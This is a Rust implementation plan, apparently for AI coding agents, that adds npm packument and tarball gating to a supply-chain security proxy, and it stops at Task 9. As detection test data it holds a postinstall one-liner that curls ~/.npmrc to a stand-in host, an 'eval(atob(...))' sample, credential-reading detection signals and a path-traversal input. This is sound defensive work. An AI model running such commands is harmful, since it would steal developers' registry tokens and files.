# npm Ecosystem Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add npm as a third ecosystem deployment of this binary, gating `npm install` at the packument (CVE + release age + AI review, newest-per-major) and at the tarball download (metadata approval + org plugins).

**Architecture:** Mirrors the cargo deployment's two-gate shape. A pure cascade core decides which versions a packument may carry; an orchestration layer fetches facts and runs reviews; two HTTP handlers serve the filtered packument and the gated tarball. The same hole that lets cargo serve a never-reviewed artifact on plugin-pass alone is closed on both paths.

**Tech Stack:** Rust 2021 (toolchain pinned 1.88.0), axum 0.8, reqwest 0.12, rusqlite, `semver` (reused from cargo), `chrono`, `serde_json`, `wiremock` + `tokio::test` for tests.

**Spec:** `docs/superpowers/specs/2026-10-30-npm-ecosystem-design.md`

## Global Constraints

- The scan path never fails open. Every error becomes a refusal or `Unverifiable`, never a serve.
- No tarball bytes are ever served for an artifact that has not passed CVE, release age, AI review, **and** plugins.
- A version reaches a forwarded packument only if CVE-clean, past the release-age threshold (or allowlisted), and AI-review-passed. There is **no fast path past AI review** — no cargo-vet equivalent, no substitute.
- `dist-tags.latest` in a forwarded packument always names a version present in that same packument's `versions`, or `dist-tags` is empty.
- Every forwarded version's `dist.tarball` points at this proxy, never upstream.
- Tarball bytes are verified against `dist.integrity`, falling back to `dist.shasum`, before any unpack.
- An oversized or unparseable packument is an error, never a partial document.
- The stored package spelling is the literal npm name, scope and slash included (`@scope/name`), in `ArtifactKey.package`, the advisory `package` column, allowlist entries, and all rendering.
- Commit messages carry no `Co-Authored-By` or other self-attribution trailer.
- Every task ends with `cargo fmt --all`, `cargo clippy --all-targets -- -D warnings`, and `cargo test --no-fail-fast` all clean before its commit.

## Review Focus

Five input classes the spec implies but whose tests do not fall out of any task's happy path. Each has a test assigned to the task that owns the code.

- **A packument with an empty or absent `versions` object** — serve a well-formed document with empty `versions` and empty `dist-tags`, never a 500. (Task 3)
- **A scoped package at the tarball route**, whose path carries a literal unencoded `/` (`/@scope/name/-/name-1.0.0.tgz`) — must route to the handler and not be rejected as an invalid name. (Task 11)
- **A version string that is not valid semver** in an upstream packument — must not panic the major-version grouping, and must be excluded deterministically rather than sorted arbitrarily. (Task 8)
- **`dist.integrity` with an algorithm this proxy cannot verify** (e.g. `sha384-`) — must refuse as unverifiable, never silently skip verification and serve. (Task 5)
- **A packument larger than the configured size cap** — must fail closed with nothing parsed, since a truncated parse drops versions indistinguishably from the gate removing them. (Task 5)

---

## File Structure

**Created:**
- `src/ecosystem/npm/mod.rs` — name validation and normalization, packument path, tarball route path
- `src/ecosystem/npm/packument.rs` — packument types, parsing, filtering, `dist-tags` repointing, `dist.tarball` rewriting (pure)
- `src/ecosystem/npm/upstream.rs` — the only module that talks to the registry: packument fetch (ETag, size cap) and tarball download
- `src/scan/npm_cascade.rs` — pure newest-per-major cascade decision core
- `src/scan/npm.rs` — cascade orchestration (`NpmScanner`)
- `src/http/npm_packument.rs` — `NpmAppState`, `npm_router`, packument handler, `/-/ping`, audit 404, shared aux routes
- `src/http/npm_download.rs` — tarball handler: metadata approval then plugin gate
- `src/http/npm_bootstrap.rs` — fail-closed startup for an npm deployment
- `tests/ecosystem_npm_names.rs`, `tests/ecosystem_npm_packument.rs`, `tests/ecosystem_npm_upstream.rs`, `tests/scan_npm.rs`, `tests/http_npm_packument.rs`, `tests/http_npm_download.rs`, `tests/http_npm_bootstrap.rs`, `tests/config_npm.rs`

**Modified:**
- `src/artifact_cache.rs` — digest validator accepts 40/64/128 hex
- `src/ai/collect.rs` — JS/TS extensions, JavaScript suspicion signals, install-scripts section, `COLLECTOR_VERSION`
- `src/ai/prompt.rs` — install-scripts prompt text, `PROMPT_VERSION`
- `src/ecosystem/install_surface.rs` — `NpmInstallSurface`, `install_commands` trait method, registry entry
- `src/ecosystem/mod.rs` — `pub mod npm;`
- `src/scan/mod.rs` — `pub mod npm; pub mod npm_cascade;`
- `src/http/mod.rs` — module declarations, re-exports
- `src/http/cargo_download.rs` — close the metadata-approval hole
- `src/config.rs` — `[npm_registry]` table, multi-ecosystem rejection
- `src/policy/mod.rs` — `[npm_registry]` fingerprint contribution
- `src/main.rs` — three-way startup dispatch, npm tickers
- `docs/operations.md` — the npm deployment, the `npm ci` limitation, the cargo gate fix

---

### Task 1: Widen the artifact cache's digest validator

**Status: DONE** (commits `b5d6bb7`). All steps complete; the task's own gate (`cargo fmt --all`, `cargo clippy --all-targets -- -D warnings`, `cargo test --no-fail-fast`) passed before its commit.

npm publishes sha512 or sha1, never sha256. `validated_sha256` rejects anything that is not exactly 64 lowercase hex and gates both `get` and `insert`, so every npm cache operation would fail.

**Files:**
- Modify: `src/artifact_cache.rs:260` (`validated_sha256`)
- Test: `tests/artifact_cache.rs`

**Interfaces:**
- Produces: `validated_sha256` accepts 40, 64, and 128 lowercase hex; `path_for`'s two-character sharding unchanged.

- [x] **Step 1: Write the failing tests**

```rust
#[test]
fn insert_and_get_round_trip_a_sha512_digest() {
    // key with sha256 field = 128 lowercase hex chars
    // assert insert() returns Ok and get() finds the file back
}

#[test]
fn insert_and_get_round_trip_a_sha1_digest() {
    // 40 lowercase hex chars; same round trip
}

#[test]
fn a_digest_of_an_unsupported_length_is_still_rejected() {
    // 63 and 100 hex chars both error
}

#[test]
fn an_uppercase_or_non_hex_digest_is_still_rejected() {
    // "A".repeat(64) and "z".repeat(64) both error
}
```

- [x] **Step 2: Run to verify failure**

Run: `cargo test --test artifact_cache`
Expected: the sha512 and sha1 round-trip tests FAIL on the validator's bail.

- [x] **Step 3: Widen `validated_sha256(sha256: &str) -> anyhow::Result<&str>`**

Accept length 40, 64, or 128 with the existing lowercase-hex character check. Update the doc comment: it validates a registry-declared digest of any algorithm this proxy verifies, length alone distinguishing them, and it remains a filesystem-path security boundary.

- [x] **Step 4: Run to verify pass**

Run: `cargo test --test artifact_cache`
Expected: PASS.

- [x] **Step 5: Verify no regression and commit**

Run: `cargo fmt --all && cargo clippy --all-targets -- -D warnings && cargo test --no-fail-fast`

```bash
git add src/artifact_cache.rs tests/artifact_cache.rs
git commit -m "feat(cache): accept sha1 and sha512 digests, not sha256 alone"
```

---

### Task 2: npm package names and registry paths

**Status: DONE** (commits `8c74fc7`). All steps complete; the task's own gate (`cargo fmt --all`, `cargo clippy --all-targets -- -D warnings`, `cargo test --no-fail-fast`) passed before its commit.

**Files:**
- Create: `src/ecosystem/npm/mod.rs`
- Modify: `src/ecosystem/mod.rs` (add `pub mod npm;`)
- Test: `tests/ecosystem_npm_names.rs`

**Interfaces:**
- Produces:
  - `pub fn validate_name(raw: &str) -> Result<String, InvalidName>` — returns the name unchanged on success. Reuse the `InvalidName` shape from `crate::ecosystem::cargo::index` by defining npm's own identical struct in this module (the cargo one is tied to that module's docs).
  - `pub fn normalize_name(name: &str) -> String` — lowercase only. npm does **not** fold `-`/`_`/`.`: `foo-bar` and `foo_bar` are different packages.
  - `pub fn packument_path(name: &str) -> String` — `name` with `/` percent-encoded as `%2f`; `@scope/name` → `@scope%2fname`.
  - `pub fn tarball_path(name: &str, version: &str) -> String` — `{name}/-/{unscoped}-{version}.tgz`, where `unscoped` drops any `@scope/` prefix.

- [x] **Step 1: Write the failing tests**

```rust
#[test] fn validate_accepts_a_plain_name() { assert_eq!(validate_name("lodash").unwrap(), "lodash"); }
#[test] fn validate_accepts_a_scoped_name() { assert_eq!(validate_name("@babel/core").unwrap(), "@babel/core"); }
#[test] fn validate_rejects_a_second_slash() { assert!(validate_name("@a/b/c").is_err()); }
#[test] fn validate_rejects_an_unscoped_slash() { assert!(validate_name("a/b").is_err()); }
#[test] fn validate_rejects_a_leading_dot_or_underscore() {
    assert!(validate_name(".hidden").is_err());
    assert!(validate_name("_internal").is_err());
}
#[test] fn validate_rejects_path_traversal_and_control_characters() {
    assert!(validate_name("../etc/passwd").is_err());
    assert!(validate_name("foo\nbar").is_err());
    assert!(validate_name("foo\\bar").is_err());
}
#[test] fn validate_rejects_a_name_over_214_characters() { assert!(validate_name(&"a".repeat(215)).is_err()); }
#[test] fn validate_rejects_a_bare_at_or_empty_scope() {
    assert!(validate_name("@").is_err());
    assert!(validate_name("@/name").is_err());
}
#[test] fn normalize_lowercases_but_folds_nothing() {
    assert_eq!(normalize_name("Lodash"), "lodash");
    assert_eq!(normalize_name("foo_bar"), "foo_bar");
    assert_eq!(normalize_name("foo-bar"), "foo-bar");
    assert_eq!(normalize_name("foo.bar"), "foo.bar");
}
#[test] fn packument_path_encodes_a_scope_separator() {
    assert_eq!(packument_path("@babel/core"), "@babel%2fcore");
    assert_eq!(packument_path("lodash"), "lodash");
}
#[test] fn tarball_path_drops_the_scope_from_the_filename() {
    assert_eq!(tarball_path("@babel/core", "7.0.0"), "@babel/core/-/core-7.0.0.tgz");
    assert_eq!(tarball_path("lodash", "4.17.21"), "lodash/-/lodash-4.17.21.tgz");
}
```

- [x] **Step 2: Run to verify failure**

Run: `cargo test --test ecosystem_npm_names`
Expected: FAIL to compile — module does not exist.

- [x] **Step 3: Implement the four functions plus `InvalidName` in `src/ecosystem/npm/mod.rs`**

`validate_name` is a security boundary: reject, never sanitise. It rejects the empty string, non-ASCII, ASCII control characters, `\`, `..`, a leading `.` or `_`, anything over 214 characters, a bare `@`, an empty scope, and any `/` except the single scope separator in a name starting with `@`.

- [x] **Step 4: Run to verify pass**

Run: `cargo test --test ecosystem_npm_names`
Expected: PASS.

- [x] **Step 5: Commit**

```bash
git add src/ecosystem/npm/mod.rs src/ecosystem/mod.rs tests/ecosystem_npm_names.rs
git commit -m "feat(npm): validate package names and build registry paths"
```

---

### Task 3: Packument parsing, filtering, and rewriting

**Status: DONE** (commits `eb5be82`, `2362173`). All steps complete; the task's own gate (`cargo fmt --all`, `cargo clippy --all-targets -- -D warnings`, `cargo test --no-fail-fast`) passed before its commit.

**Files:**
- Create: `src/ecosystem/npm/packument.rs`
- Modify: `src/ecosystem/npm/mod.rs` (add `pub mod packument;`)
- Test: `tests/ecosystem_npm_packument.rs`

**Interfaces:**
- Consumes: Task 2's `tarball_path`.
- Produces:
  - `pub struct Packument { pub name: String, pub versions: BTreeMap<String, PackumentVersion>, pub dist_tags: BTreeMap<String, String>, pub time: BTreeMap<String, DateTime<Utc>>, pub raw: serde_json::Value }`
  - `pub struct PackumentVersion { pub version: String, pub dist: Dist, pub deprecated: Option<String>, pub scripts: BTreeMap<String, String> }`
  - `pub struct Dist { pub tarball: String, pub integrity: Option<String>, pub shasum: Option<String> }`
  - `pub fn parse_packument(body: &str) -> anyhow::Result<Packument>`
  - `pub fn declared_digest(dist: &Dist) -> Option<DeclaredDigest>` and `pub struct DeclaredDigest { pub algorithm: DigestAlgorithm, pub hex: String }`, `pub enum DigestAlgorithm { Sha1, Sha512 }` — prefers `integrity`, falls back to `shasum` (always `Sha1`). An `integrity` whose algorithm prefix is neither `sha1-` nor `sha512-` yields `None`, which Task 5 turns into a refusal.
  - `pub fn filter_packument(source: &Packument, keep: &[String], public_base: &str) -> serde_json::Value` — emits a document carrying only `keep`'s versions, each version's `dist.tarball` rewritten to `{public_base}/{tarball_path(name, version)}`, and `dist-tags` repointed per the rules below.

- [x] **Step 1: Write the failing tests**

```rust
#[test] fn parse_reads_versions_dist_tags_and_time() { /* name, two versions, latest tag, two time entries */ }
#[test] fn parse_reads_integrity_shasum_deprecated_and_scripts() { /* one version carrying all four */ }
#[test] fn parse_tolerates_an_absent_time_map() { /* abbreviated-shaped body; time is empty, not an error */ }

#[test] fn declared_digest_prefers_integrity_over_shasum() { /* sha512- integrity wins; hex decoded from base64 */ }
#[test] fn declared_digest_falls_back_to_shasum_when_integrity_is_absent() { /* Sha1, 40 hex */ }
#[test] fn declared_digest_rejects_an_unverifiable_integrity_algorithm() {
    // "sha384-..." yields None even when a shasum is also present:
    // a stronger declared digest must never be silently downgraded.
}

#[test] fn filter_keeps_only_the_named_versions() { /* three in, one kept */ }
#[test] fn filter_rewrites_every_tarball_url_at_the_proxy() { /* assert no surviving url contains "registry.npmjs.org" */ }
#[test] fn filter_keeps_a_dist_tag_whose_target_survived() { /* latest -> 2.0.0, kept */ }
#[test] fn filter_repoints_latest_when_its_target_was_removed() {
    // latest pointed at 3.0.0 which was filtered out; kept 2.0.0 and 1.0.0
    // => latest == "2.0.0" (newest survivor by semver, not by map order)
}
#[test] fn filter_drops_a_non_latest_tag_whose_target_was_removed() {
    // "beta" -> 3.0.0-beta.1, filtered out => "beta" absent, not repointed
}
#[test] fn filter_with_no_survivors_emits_empty_versions_and_empty_dist_tags() {
    // Review Focus: must be a well-formed document, never an error
}
#[test] fn filter_preserves_the_deprecated_field_on_a_surviving_version() { /* npm still warns the developer */ }
#[test] fn parse_then_filter_an_upstream_packument_with_no_versions_object_is_empty_not_an_error() {
    // Review Focus: `{"name":"x"}` parses, filters to empty, does not panic
}
```

- [x] **Step 2: Run to verify failure**

Run: `cargo test --test ecosystem_npm_packument`
Expected: FAIL to compile.

- [x] **Step 3: Implement the types and three functions**

`parse_packument` keeps the original document in `raw` so `filter_packument` can emit upstream's own fields untouched for surviving versions rather than reconstructing them — anything npm needs that this struct does not model must survive the round trip. `filter_packument` therefore edits a clone of `raw`: prune `versions` to `keep`, rewrite each survivor's `dist.tarball`, then rebuild `dist-tags`. `latest` repoints to the semver-newest survivor when its original target is gone; any other tag whose target is gone is removed.

- [x] **Step 4: Run to verify pass**

Run: `cargo test --test ecosystem_npm_packument`
Expected: PASS.

- [x] **Step 5: Commit**

```bash
git add src/ecosystem/npm/packument.rs src/ecosystem/npm/mod.rs tests/ecosystem_npm_packument.rs
git commit -m "feat(npm): parse, filter and rewrite packuments"
```

---

### Task 4: The `[npm_registry]` config table and its fingerprint

**Status: DONE** (commits `5dbbed1`). All steps complete; the task's own gate (`cargo fmt --all`, `cargo clippy --all-targets -- -D warnings`, `cargo test --no-fail-fast`) passed before its commit.

**Files:**
- Modify: `src/config.rs`, `src/policy/mod.rs`
- Test: `tests/config_npm.rs`, `tests/policy.rs`

**Interfaces:**
- Produces:
  - `pub struct NpmRegistryConfig { pub upstream_registry_url: Url, pub scan_budget: Duration, pub max_packument_bytes: u64, pub min_release_age_days: Option<u64> }` with `#[serde(deny_unknown_fields)]`.
  - `Config::npm_registry: Option<NpmRegistryConfig>`.
  - Defaults: `scan_budget` 120s (held inline; npm's own `fetch-timeout` is 300s, leaving headroom — see the spec's "Budget" section), `max_packument_bytes` 67_108_864 (64 MiB).
  - `Config::validate` rejects a file carrying more than one of `cargo_registry`/`npm_registry`, naming both.
  - `policy_fingerprint` appends, when `npm_registry` is present: the marker `npm_registry`, then `min_release_age_days` when set. `upstream_registry_url`, `scan_budget` and `max_packument_bytes` stay out — operational knobs, like `bind` and `base_url`.

- [x] **Step 1: Write the failing tests**

```rust
// tests/config_npm.rs
#[test] fn npm_registry_absent_leaves_none() {}
#[test] fn npm_registry_minimal_applies_documented_defaults() {
    // scan_budget == 120s, max_packument_bytes == 67_108_864, min_release_age_days == None
}
#[test] fn npm_registry_accepts_explicit_overrides() {}
#[test] fn a_config_with_both_cargo_and_npm_tables_is_rejected() {
    // error message names both tables
}
#[test] fn an_unconfigured_npm_registry_appends_nothing_to_the_fingerprint() {
    // equals the pinned FINGERPRINT_BEFORE_OPTIONAL_TABLES digest
}
#[test] fn changing_npm_min_release_age_days_changes_the_fingerprint() {}
#[test] fn changing_the_npm_upstream_url_or_budget_leaves_the_fingerprint_alone() {}
```

- [x] **Step 2: Run to verify failure**

Run: `cargo test --test config_npm`
Expected: FAIL to compile.

- [x] **Step 3: Implement the struct, the field, the validation and the fingerprint contribution**

Follow `CargoRegistryConfig`'s shape exactly, including its doc-comment discipline. The npm `scan_budget` is deliberately its own field rather than reusing the top-level one: see the spec's "Budget" section for why a PyPI-shaped deadline converts npm slowness into hard install failure.

- [x] **Step 4: Run to verify pass**

Run: `cargo test --test config_npm --test policy`
Expected: PASS.

- [x] **Step 5: Commit**

```bash
git add src/config.rs src/policy/mod.rs tests/config_npm.rs tests/policy.rs
git commit -m "feat(npm): add the [npm_registry] config table and its fingerprint"
```

---

### Task 5: The npm registry upstream client

**Status: DONE** (commits `d954fe3`, `6da7616`). All steps complete; the task's own gate (`cargo fmt --all`, `cargo clippy --all-targets -- -D warnings`, `cargo test --no-fail-fast`) passed before its commit.

**Files:**
- Create: `src/ecosystem/npm/upstream.rs`
- Modify: `src/ecosystem/npm/mod.rs` (add `pub mod upstream;`)
- Test: `tests/ecosystem_npm_upstream.rs`

**Interfaces:**
- Consumes: Task 2's `packument_path`, Task 3's `parse_packument`/`declared_digest`/`DeclaredDigest`, Task 4's `NpmRegistryConfig`.
- Produces:
  - `pub struct NpmUpstream` with `pub fn with_limits(registry_base: Url, max_packument_bytes: u64, download_limits: &DownloadLimits) -> anyhow::Result<Self>`
  - `pub enum UpstreamError { Unavailable(String), NotFound, Other(anyhow::Error) }` — the same three-variant shape and 404-is-not-an-outage discipline the other two upstreams use.
  - `pub async fn packument(&self, name: &str) -> Result<Packument, UpstreamError>` — always requests the **full** form (no `vnd.npm.install-v1+json` Accept header) so `time` is present. Sends `If-None-Match` from its ETag cache and, on 304, returns the cached document. Refuses a body over `max_packument_bytes` before parsing, checked against `Content-Length` when present and against running bytes read either way.
  - `pub async fn download_tarball(&self, name: &str, version: &str, dist: &Dist, dest: &Path) -> Result<DeclaredDigest, UpstreamError>` — streams to a temp path beside `dest`, hashes with the algorithm `declared_digest` selected, renames into place only on a digest match, and returns the digest actually verified. A `Dist` whose digest is unverifiable (`declared_digest` → `None`) is `UpstreamError::Other` before any request.

- [x] **Step 1: Write the failing tests**

```rust
#[tokio::test] async fn packument_fetches_and_parses_the_full_document() {}
#[tokio::test] async fn packument_requests_the_full_form_not_the_abbreviated_one() {
    // assert the recorded request carries no vnd.npm.install-v1+json Accept header
}
#[tokio::test] async fn packument_encodes_a_scoped_name_in_its_path() {
    // mock mounted at "/@babel%2fcore"
}
#[tokio::test] async fn packument_maps_a_404_to_not_found() {}
#[tokio::test] async fn packument_maps_a_500_to_unavailable() {}
#[tokio::test] async fn packument_sends_if_none_match_on_a_second_fetch_and_reuses_the_cached_body_on_304() {
    // two fetches, second answered 304 with an empty body; assert equal results and 2 upstream hits
}
#[tokio::test] async fn a_packument_over_the_size_cap_is_refused_and_nothing_is_parsed() {
    // Review Focus: honest Content-Length over the cap => Err, no partial document
}
#[tokio::test] async fn a_packument_lying_about_its_length_is_still_caught_while_streaming() {}

#[tokio::test] async fn download_tarball_verifies_a_sha512_integrity_and_returns_its_digest() {}
#[tokio::test] async fn download_tarball_falls_back_to_shasum_when_integrity_is_absent() {}
#[tokio::test] async fn download_tarball_refuses_an_unverifiable_integrity_algorithm_without_requesting_anything() {
    // Review Focus: "sha384-..." => Err and zero upstream hits
}
#[tokio::test] async fn download_tarball_rejects_a_digest_mismatch_and_leaves_no_file() {}
#[tokio::test] async fn download_tarball_of_a_truncated_body_errors_rather_than_leaving_a_partial_file() {}
```

- [x] **Step 2: Run to verify failure**

Run: `cargo test --test ecosystem_npm_upstream`
Expected: FAIL to compile.

- [x] **Step 3: Implement `NpmUpstream`**

Two `reqwest::Client`s, as in `cargo/upstream.rs`: one for packuments with a total deadline, one for tarballs with `read_timeout` (stall detection) and no total deadline, bounded from outside by `DownloadLimits::max_duration`. The ETag cache is an in-memory `Mutex<HashMap<String, (String, String)>>` of name → (etag, body); a 304 with no cached body is `Unavailable`, never an empty document.

- [x] **Step 4: Run to verify pass**

Run: `cargo test --test ecosystem_npm_upstream`
Expected: PASS.

- [x] **Step 5: Commit**

```bash
git add src/ecosystem/npm/upstream.rs src/ecosystem/npm/mod.rs tests/ecosystem_npm_upstream.rs
git commit -m "feat(npm): add the registry client with etag caching and digest verification"
```

---

### Task 6: JavaScript and TypeScript in the collector

**Status: DONE** (commits `d781065`). All steps complete; the task's own gate (`cargo fmt --all`, `cargo clippy --all-targets -- -D warnings`, `cargo test --no-fail-fast`) passed before its commit.

**Files:**
- Modify: `src/ai/collect.rs` (`REVIEWABLE_EXTENSIONS`, `SUSPICION_SIGNALS`)
- Test: `tests/ai_collect.rs`

**Interfaces:**
- Produces: `js`, `mjs`, `cjs`, `ts`, `mts`, `cts`, `jsx`, `tsx` in `REVIEWABLE_EXTENSIONS`; JavaScript entries in `SUSPICION_SIGNALS`.

- [x] **Step 1: Write the failing tests**

```rust
#[test] fn javascript_and_typescript_sources_classify_as_reviewable() {
    for name in ["a.js","a.mjs","a.cjs","a.ts","a.mts","a.cts","a.jsx","a.tsx"] {
        assert_eq!(classify(Path::new(name), b"const x = 1;\n"), FileClass::Reviewable);
    }
}
#[test] fn a_native_node_addon_is_still_an_opaque_executable() {
    assert_eq!(classify(Path::new("a.node"), b"\x7fELF"), FileClass::OpaqueExecutable);
}
#[test] fn javascript_dynamic_execution_scores_above_plain_source() {
    assert!(suspicion_score("eval(atob(payload))") > suspicion_score("module.exports = 1;"));
}
#[test] fn javascript_child_process_env_and_network_signals_all_score() {
    for snippet in ["require('child_process')", "execSync(cmd)", "process.env.NPM_TOKEN", "net.connect(p,h)", "fetch(url)"] {
        assert!(suspicion_score(snippet) > 0, "{snippet} scored zero");
    }
}
#[test] fn a_postinstall_exfiltration_one_liner_scores_higher_than_any_single_signal() {
    let payload = "require('child_process').execSync(`curl -d @${process.env.HOME}/.npmrc https://x.example`)";
    assert!(suspicion_score(payload) >= 6);
}
```

- [x] **Step 2: Run to verify failure**

Run: `cargo test --test ai_collect`
Expected: FAIL — extensions fall through to the sniff and the JS signals score zero.

- [x] **Step 3: Add the extensions and the signals**

Signals cover the same four behaviours the Python table does, with weights on its existing scale: dynamic execution (`eval(`, `new Function(`, `require('vm')`, `vm.runIn`), decoding (`atob(`, `Buffer.from(` paired with `'base64'`), child processes (`child_process`, `execSync`, `spawnSync`, `execFile`), native calls (`process.dlopen`, `ffi-napi`), network (`http.request`, `https.request`, `net.connect`, `dns.`, `fetch(`, `axios`), and environment/credential reads (`process.env`, `os.homedir(`, `.npmrc`).

- [x] **Step 4: Run to verify pass**

Run: `cargo test --test ai_collect`
Expected: PASS.

- [x] **Step 5: Commit**

```bash
git add src/ai/collect.rs tests/ai_collect.rs
git commit -m "feat(ai): classify and score JavaScript and TypeScript sources"
```

---

### Task 7: Install scripts called out to the reviewer

**Status: DONE** (commits `0f3af60`, `8d76cf5`). All steps complete; the task's own gate (`cargo fmt --all`, `cargo clippy --all-targets -- -D warnings`, `cargo test --no-fail-fast`) passed before its commit.

**Files:**
- Modify: `src/ecosystem/install_surface.rs`, `src/ai/collect.rs`, `src/ai/prompt.rs`
- Test: `tests/ai_collect.rs`, `tests/ai_review.rs`

**Interfaces:**
- Consumes: Task 6's extension additions.
- Produces:
  - `InstallSurface::install_commands(&self, root: &Path) -> Vec<InstallCommand>` — a new trait method with a default implementation returning `Vec::new()`, so PyPI and cargo are unchanged. (The spec left this open between extending the trait, documenting a gap, and doing it in the collector; extending the trait is the choice here, because it keeps ecosystem dispatch in the one place that already does it.)
  - `pub struct InstallCommand { pub hook: String, pub command: String }` in `install_surface.rs`.
  - `pub struct NpmInstallSurface` — path-only install surface for `package/package.json` and `package/index.js`, plus `install_commands` reading `package/package.json`'s `scripts` for `preinstall`, `install`, `postinstall`, `prepare`.
  - `install_surface_for("npm")` resolves to it.
  - `CollectedPayload::install_commands: Vec<InstallCommand>`, populated by `collect`.
  - `COLLECTOR_VERSION` and `PROMPT_VERSION` both bumped.
  - `build_request` emits an install-commands section before the file blocks when the list is non-empty, and the system prompt gains matching text.

- [x] **Step 1: Write the failing tests**

```rust
// tests/ai_collect.rs
#[test] fn npm_install_surface_matches_package_json_and_index() {
    assert!(NpmInstallSurface.is_install_surface(Path::new("package/package.json")));
    assert!(NpmInstallSurface.is_install_surface(Path::new("package/index.js")));
    assert!(!NpmInstallSurface.is_install_surface(Path::new("package/lib/util.js")));
}
#[test] fn npm_install_commands_extracts_the_four_install_hooks_in_order() {
    // package.json with preinstall, install, postinstall, prepare, plus "test" and "build"
    // => exactly the four, in that order; "test"/"build" absent
}
#[test] fn npm_install_commands_is_empty_for_a_package_with_no_scripts() {}
#[test] fn npm_install_commands_is_empty_rather_than_an_error_for_unparseable_package_json() {}
#[test] fn pypi_and_cargo_install_commands_default_to_empty() {}
#[test] fn collect_populates_install_commands_from_the_surface() {}

// tests/ai_review.rs
#[test] fn the_request_flags_install_commands_ahead_of_the_file_blocks() {
    // the section appears before the first "BEGIN FILE", names each hook and its
    // literal command text, and says the commands run automatically at install time
}
#[test] fn the_request_omits_the_section_when_there_are_no_install_commands() {}
#[test] fn the_system_prompt_tells_the_model_install_commands_run_automatically() {}
```

- [x] **Step 2: Run to verify failure**

Run: `cargo test --test ai_collect --test ai_review`
Expected: FAIL to compile.

- [x] **Step 3: Implement the trait method, `NpmInstallSurface`, the payload field, and the prompt section**

The payload section is small and the highest-signal content in the review, so it is emitted in full and is not subject to `max_payload_bytes` eviction; its bytes are excluded from the coverage figures, which describe file content. The system prompt gains one sentence in its existing voice (one instruction per sentence, ASCII only), stating that commands in the install-commands section run automatically when the package is installed, without the developer invoking them, and warrant the closest scrutiny.

`NpmInstallSurface::is_install_surface` stays path-only and therefore covers only the conventional paths. A file named by `main`, `bin`, or a script target is **not** install surface under it, because deciding that needs `package.json`'s contents. Say so in the type's doc comment, the way `CargoInstallSurface` already documents the same limitation for proc-macro entry points — the install-commands section carries the script *commands* regardless, so what this misses is the ordering boost for the files those commands name, not the commands themselves.

- [x] **Step 4: Run to verify pass**

Run: `cargo test --test ai_collect --test ai_review`
Expected: PASS.

- [x] **Step 5: Commit**

```bash
git add src/ecosystem/install_surface.rs src/ai/collect.rs src/ai/prompt.rs tests/ai_collect.rs tests/ai_review.rs
git commit -m "feat(ai): surface npm install scripts to the reviewer as their own section"
```

---

### Task 8: The pure newest-per-major cascade core

**Status: DONE** (commits `2c40463`, `595604e`). All steps complete; the task's own gate (`cargo fmt --all`, `cargo clippy --all-targets -- -D warnings`, `cargo test --no-fail-fast`) passed before its commit.

**Files:**
- Create: `src/scan/npm_cascade.rs`
- Modify: `src/scan/mod.rs` (add `pub mod npm_cascade;`)
- Test: inline `#[cfg(test)] mod tests`

**Interfaces:**
- Produces:
  - `pub struct NpmCascadeInput { pub versions: Vec<String>, pub cve_blocked: HashSet<String>, pub too_new: HashSet<String>, pub review_status: HashMap<String, ReviewStatus>, pub allowlisted: HashSet<String> }` — reuses `crate::scan::cargo_cascade::ReviewStatus`.
  - `pub enum NpmNextStep { Forward(Vec<String>), NeedsReview(String) }`
  - `pub fn plan_npm_cascade(input: &NpmCascadeInput) -> NpmNextStep`

Rules: drop every version in `cve_blocked` or `too_new` that is not `allowlisted`. Group survivors by semver major. A version is forwardable if allowlisted or review-passed. Within each major line, newest-first, the newest survivor that is neither forwardable nor review-failed is a review candidate. Major lines are visited newest-first, so the returned candidate comes from the newest line that still has one. When no line has a candidate, forward every forwardable survivor — at most the newest passing version per major line, newest line first. Unlike `plan_cascade`, nothing is excluded for being deprecated: npm installs deprecated versions routinely, so excluding them would break ordinary resolution.

- [x] **Step 1: Write the failing tests**

```rust
#[test] fn the_newest_version_of_the_newest_major_is_the_first_candidate() {}
#[test] fn a_passing_version_in_each_major_line_is_forwarded_together() {
    // 3.1.0, 2.4.0, 1.9.0 all passed => all three forwarded, newest first
}
#[test] fn only_the_newest_passing_version_of_a_major_line_is_forwarded() {
    // 2.4.0 and 2.3.0 both passed => 2.4.0 forwarded, 2.3.0 not
}
#[test] fn a_failed_newest_version_cascades_within_its_own_major_line() {
    // 3.2.0 failed => candidate is 3.1.0, not 2.x
}
#[test] fn an_exhausted_major_line_moves_to_the_next_line_down() {
    // every 3.x failed => candidate is the newest 2.x
}
#[test] fn a_cve_blocked_version_is_never_a_candidate() {}
#[test] fn a_too_new_version_is_never_a_candidate() {}
#[test] fn an_allowlisted_version_is_forwarded_despite_cve_and_age_blocks() {}
#[test] fn a_deprecated_version_is_still_a_candidate() {
    // no deprecated field in the input at all: this test documents the decision
    // by showing nothing excludes it
}
#[test] fn every_version_failing_forwards_an_empty_list_rather_than_erroring() {}
#[test] fn a_zero_major_prerelease_line_is_its_own_group() {
    // 0.2.0 and 0.1.0 are different "majors" for npm caret semantics
}
#[test] fn an_unparseable_version_is_excluded_deterministically_and_never_panics() {
    // Review Focus: "not-a-version" and "1.x" are dropped, the rest resolve normally,
    // and two identical inputs produce identical output
}
```

- [x] **Step 2: Run to verify failure**

Run: `cargo test --lib npm_cascade`
Expected: FAIL to compile.

- [x] **Step 3: Implement `plan_npm_cascade`**

Pure, never panics, never errors. A version that does not parse as semver is excluded from the survivor set entirely rather than sorted arbitrarily — unlike `cargo_cascade::sort_newest_first`, which sorts unparseable versions last, because here an unparseable version has no major line to belong to. `0.x` versions group by minor, matching npm's caret semantics where `^0.2.0` does not accept `0.3.0`.

- [x] **Step 4: Run to verify pass**

Run: `cargo test --lib npm_cascade`
Expected: PASS.

- [x] **Step 5: Commit**

```bash
git add src/scan/npm_cascade.rs src/scan/mod.rs
git commit -m "feat(npm): add the newest-per-major cascade decision core"
```

---

### Task 9: Cascade orchestration

**Status: DONE** (commits `21ab4ec`). All steps complete; the task's own gate (`cargo fmt --all`, `cargo clippy --all-targets -- -D warnings`, `cargo test --no-fail-fast`) passed before its commit.

**Files:**
- Create: `src/scan/npm.rs`
- Modify: `src/scan/mod.rs` (add `pub mod npm;`)
- Test: `tests/scan_npm.rs`

**Interfaces:**
